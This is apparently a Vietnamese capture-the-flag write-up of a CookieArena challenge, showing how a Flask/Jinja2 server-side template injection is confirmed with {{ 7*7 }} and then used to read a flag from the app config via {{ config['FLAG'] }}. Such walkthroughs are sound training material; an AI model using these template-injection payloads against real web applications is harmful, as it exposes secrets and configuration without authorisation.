# CookieArena - Part 2

# **What is your name?**

- Trong phần tag có thể thấy bài này có lỗ hổng SSTI và nó thuộc loại Flask/Jinja2
- Bắt đầu thử với payload: `?name={{ 7*7 }}`

![image.png](CookieArena%20-%20Part%202%2024eede0de67a80c1865fc1777e8f71e2/image.png)

- Có thể thấy nó `Hello 49` là kết quả của `7*7` kia
- Thêm việc được cung cấp code trong phần giới thiệu

```python
if os.path.exists("/flag.txt"):
    with open("/flag.txt", "r") as file:
        app.config['FLAG'] = file.read().strip()
else:
    app.config['FLAG'] = "CHH{ThiS_i5_Y0ur_FaKE_fLaG}"
```

- Thì ta thử với payload: `?name={{ config['FLAG'] }}`

![image.png](CookieArena%20-%20Part%202%2024eede0de67a80c1865fc1777e8f71e2/image%201.png)

---

#